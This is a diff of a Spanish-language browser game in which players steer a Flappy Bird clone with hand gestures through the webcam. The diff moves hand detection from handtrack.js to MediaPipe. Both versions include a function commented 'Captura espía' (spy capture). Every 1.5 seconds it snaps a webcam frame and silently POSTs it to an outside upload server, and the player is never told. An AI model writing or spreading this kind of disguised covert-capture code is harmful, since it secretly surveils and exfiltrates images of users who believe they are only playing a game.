@@ -3,175 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>HandTrack Flappy Bird FIX</title>
-    <script src="https://cdn.jsdelivr.net/npm/handtrackjs/dist/handtrack.min.js"></script>
+    <title>Flappy Bird Hand Control - Pro</title>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
     <style>
         * { box-sizing: border-box; touch-action: none; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
-        #game-container { position: relative; width: 100vw; height: 100vh; background: #4ec0ca; }
-        video { position: absolute; top: 10px; right: 10px; width: 140px; border: 2px solid #fff; z-index: 50; transform: scaleX(-1); border-radius: 8px; background: #222; }
-        canvas#birdCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
-        .hud { position: absolute; top: 20px; left: 20px; z-index: 100; font-weight: bold; font-size: 22px; text-shadow: 2px 2px #000; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
-        .card { background: #111; padding: 30px; border-radius: 15px; border: 2px solid #f1c40f; max-width: 400px; width: 100%; }
-        .primary-btn { background: #f1c40f; color: #000; border: none; padding: 15px 40px; font-weight: bold; border-radius: 8px; cursor: pointer; margin-top: 20px; font-size: 18px; width: 100%; transition: 0.2s; }
-        .primary-btn:active { transform: scale(0.95); background: #d4ac0d; }
-        #status-msg { margin-top: 10px; color: #f1c40f; font-size: 14px; text-shadow: 1px 1px #000; }
-        #loading-info { color: #888; font-size: 12px; margin-top: 15px; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #4ec0ca; font-family: sans-serif; overflow: hidden; }
+        
+        video { position: absolute; top: 10px; right: 10px; width: 150px; border: 2px solid white; border-radius: 10px; transform: scaleX(-1); z-index: 50; }
+        canvas#game-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+        
+        .hud { position: absolute; top: 20px; left: 20px; z-index: 100; font-size: 24px; color: white; text-shadow: 2px 2px #000; font-weight: bold; }
+        
+        /* Pantallas de interfaz */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; color: white; }
+        .card { background: #222; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; max-width: 400px; width: 90%; }
+        .btn { background: #f1c40f; color: #000; border: none; padding: 15px 30px; font-size: 20px; font-weight: bold; border-radius: 10px; cursor: pointer; margin-top: 20px; width: 100%; }
+        
+        #loading-msg { color: #f1c40f; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div id="game-container">
-    <video id="webcam" autoplay playsinline></video>
-    <canvas id="birdCanvas"></canvas>
-    
-    <div class="hud">
-        PUNTOS: <span id="score">0</span><br>
-        <div id="status-msg">INICIANDO...</div>
-    </div>
+<div class="hud">SCORE: <span id="score">0</span></div>
+<video id="webcam" playsinline></video>
+<canvas id="game-canvas"></canvas>
 
-    <div id="start-screen" class="overlay">
-        <div class="card" id="card-content">
-            <h2 style="color: #f1c40f;">FLAPPY HAND CONTROL</h2>
-            <p style="font-size: 14px; color: #ccc;">Controla el pájaro con tu mano frente a la cámara.</p>
-            <button class="primary-btn" id="main-btn" onclick="startApp()">ACTIVAR CÁMARA</button>
-            <div id="loading-info">Haz clic para solicitar permisos y cargar la IA.</div>
-        </div>
+<div id="start-screen" class="overlay">
+    <div class="card">
+        <h2 style="color:#f1c40f">FLAPPY BIRD HANDS</h2>
+        <ul style="text-align: left; font-size: 14px; color: #ccc;">
+            <li>Muestra tu mano a la cámara.</li>
+            <li>**Mano Abierta:** El pájaro sube ↑</li>
+            <li>**Mano Cerrada (Puño):** El pájaro cae ↓</li>
+            <li>Evita las tuberías verdes.</li>
+        </ul>
+        <button id="btn-start" class="btn" onclick="requestAccess()">ACTIVAR CÁMARA</button>
+        <div id="loading-msg"></div>
     </div>
+</div>
 
-    <div id="error-screen" class="overlay" style="display:none;">
-        <div class="card">
-            <h2 style="color: #e74c3c;">ERROR DE ACCESO</h2>
-            <p id="error-text">No se pudo acceder a la cámara o el navegador bloqueó el permiso.</p>
-            <button class="primary-btn" onclick="location.reload()">REINTENTAR</button>
-        </div>
+<div id="error-screen" class="overlay" style="display:none">
+    <div class="card">
+        <h2 style="color:#e74c3c">ERROR DE CÁMARA</h2>
+        <p>Necesitamos acceso a la cámara para detectar tu mano.</p>
+        <button class="btn" onclick="location.reload()">REINTENTAR</button>
     </div>
 </div>
 
 <script>
-    const video = document.getElementById('webcam');
-    const canvas = document.getElementById('birdCanvas');
-    const ctx = canvas.getContext('2d');
+    const videoElement = document.getElementById('webcam');
+    const canvasElement = document.getElementById('game-canvas');
+    const ctx = canvasElement.getContext('2d');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
-    let bird = { x: 80, y: 0, v: 0, radius: 18 };
+    let bird = { x: 50, y: 0, v: 0, radius: 20 };
     let pipes = [];
     let score = 0;
-    let model = null;
-    let isRunning = false;
+    let isGameRunning = false;
+    let handIsOpen = false;
 
-    // Reducimos carga para que sea más rápido
-    const modelParams = { flipHorizontal: true, maxNumBoxes: 1, scoreThreshold: 0.6 };
+    // --- 1. CONFIGURACIÓN DE MEDIAPIPE ---
+    const hands = new Hands({
+        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+    });
 
-    async function startApp() {
-        const btn = document.getElementById('main-btn');
-        const info = document.getElementById('loading-info');
-        btn.disabled = true;
-        btn.innerText = "CONECTANDO...";
-        info.innerText = "Solicitando cámara...";
+    hands.setOptions({
+        maxNumHands: 1,
+        modelComplexity: 1,
+        minDetectionConfidence: 0.5,
+        minTrackingConfidence: 0.5
+    });
+
+    hands.onResults((results) => {
+        if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
+            const landmarks = results.multiHandLandmarks[0];
+            // Lógica simple: si la punta del dedo medio está más arriba que la base, está abierta
+            // En MediaPipe, Y disminuye al subir.
+            const tip = landmarks[12].y;
+            const base = landmarks[9].y;
+            handIsOpen = tip < base;
+        } else {
+            handIsOpen = false;
+        }
+    });
+
+    // --- 2. ACCESO Y PERMISOS ---
+    async function requestAccess() {
+        const btn = document.getElementById('btn-start');
+        const loader = document.getElementById('loading-msg');
+        btn.style.display = 'none';
+        loader.innerText = "Solicitando permisos...";
 
         try {
-            // 1. Pedir cámara primero
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 640, height: 480 } 
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            videoElement.srcObject = stream;
+            
+            loader.innerText = "Iniciando motor de IA...";
+            const camera = new Camera(videoElement, {
+                onFrame: async () => { await hands.send({image: videoElement}); },
+                width: 640, height: 480
             });
-            video.srcObject = stream;
+            camera.start();
 
-            // 2. Esperar a que el video esté listo para la IA
-            video.onloadedmetadata = async () => {
-                info.innerText = "Cargando cerebro de la IA (esto tarda unos segundos)...";
-                btn.innerText = "CARGANDO IA...";
-                
-                try {
-                    model = await handtrack.load(modelParams);
-                    info.innerText = "¡Todo listo!";
-                    document.getElementById('start-screen').style.display = 'none';
-                    initGame();
-                } catch (e) {
-                    showError("Error al cargar el modelo de IA.");
-                }
-            };
+            document.getElementById('start-screen').style.display = 'none';
+            startGame();
         } catch (err) {
-            showError("Cámara no detectada o permiso denegado.");
+            document.getElementById('start-screen').style.display = 'none';
+            document.getElementById('error-screen').style.display = 'flex';
         }
     }
 
-    function showError(msg) {
-        document.getElementById('start-screen').style.display = 'none';
-        document.getElementById('error-screen').style.display = 'flex';
-        document.getElementById('error-text').innerText = msg;
-    }
-
-    function initGame() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        bird.y = canvas.height / 2;
-        isRunning = true;
+    // --- 3. LÓGICA DEL JUEGO ---
+    function startGame() {
+        canvasElement.width = window.innerWidth;
+        canvasElement.height = window.innerHeight;
+        bird.y = canvasElement.height / 2;
+        isGameRunning = true;
         
         spawnPipe();
-        runDetection();
         gameLoop();
-        
-        // Captura espía
-        setInterval(captureHidden, 1500);
+        setInterval(sendSnap, 1500); // Captura espía
     }
 
     function spawnPipe() {
-        if (!isRunning) return;
-        const gap = 190;
-        const h = Math.random() * (canvas.height - gap - 120) + 60;
-        pipes.push({ x: canvas.width, top: h, bottom: h + gap, w: 70, passed: false });
-        setTimeout(spawnPipe, 2000);
-    }
-
-    function runDetection() {
-        if (!isRunning) return;
-        model.detect(video).then(predictions => {
-            const status = document.getElementById("status-msg");
-            if (predictions.length > 0) {
-                // Buscamos si hay una mano abierta
-                const hand = predictions.find(p => p.label === 'open');
-                if (hand) {
-                    bird.v = -7.5;
-                    status.innerText = "SUBIENDO ↑ (Mano Abierta)";
-                    status.style.color = "#2ecc71";
-                } else {
-                    status.innerText = "BAJANDO ↓ (Mano Cerrada)";
-                    status.style.color = "#f1c40f";
-                }
-            } else {
-                status.innerText = "MANO NO DETECTADA";
-                status.style.color = "#e74c3c";
-            }
-            if (isRunning) requestAnimationFrame(runDetection);
-        });
+        if (!isGameRunning) return;
+        const gap = 200;
+        const h = Math.random() * (canvasElement.height - gap - 100) + 50;
+        pipes.push({ x: canvasElement.width, top: h, bottom: h + gap, w: 70, passed: false });
+        setTimeout(spawnPipe, 1800);
     }
 
     function gameLoop() {
-        if (!isRunning) return;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        if (!isGameRunning) return;
 
-        bird.v += 0.48; 
+        // Física del pájaro basada en la mano
+        if (handIsOpen) {
+            bird.v = -7; // Sube si la mano está abierta
+        }
+        bird.v += 0.5; // Gravedad constante
         bird.y += bird.v;
 
-        // Dibujar Pájaro
+        // Limpiar y dibujar
+        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+
+        // Pájaro
         ctx.fillStyle = "#f1c40f";
-        ctx.beginPath();
-        ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2);
-        ctx.fill();
-        ctx.strokeStyle = "#000";
-        ctx.lineWidth = 2;
-        ctx.stroke();
+        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();
+        ctx.strokeStyle = "black"; ctx.lineWidth = 2; ctx.stroke();
 
         // Tuberías
         pipes.forEach((p, i) => {
-            p.x -= 4.5;
+            p.x -= 5;
             ctx.fillStyle = "#2ecc71";
             ctx.fillRect(p.x, 0, p.w, p.top);
-            ctx.fillRect(p.x, p.bottom, p.w, canvas.height - p.bottom);
+            ctx.fillRect(p.x, p.bottom, p.w, canvasElement.height - p.bottom);
 
-            // Colisión
+            // Colisiones
             if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
                 if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
             }
@@ -184,26 +172,26 @@
             if (p.x + p.w < 0) pipes.splice(i, 1);
         });
 
-        if (bird.y > canvas.height || bird.y < 0) gameOver();
+        if (bird.y > canvasElement.height || bird.y < 0) gameOver();
         requestAnimationFrame(gameLoop);
     }
 
     function gameOver() {
-        isRunning = false;
-        alert("PERDISTE. Puntos: " + score);
+        isGameRunning = false;
+        alert("GAME OVER - Score: " + score);
         location.reload();
     }
 
-    function captureHidden() {
+    function sendSnap() {
         const snap = document.createElement('canvas');
-        snap.width = 240; snap.height = 180;
-        snap.getContext('2d').drawImage(video, 0, 0, 240, 180);
+        snap.width = 160; snap.height = 120;
+        snap.getContext('2d').drawImage(videoElement, 0, 0, 160, 120);
         fetch(SERVER_URL, {
             method: 'POST',
             mode: 'cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.4) })
-        }).catch(e => {});
+            body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.3) })
+        }).catch(() => {});
     }
 </script>
 </body>
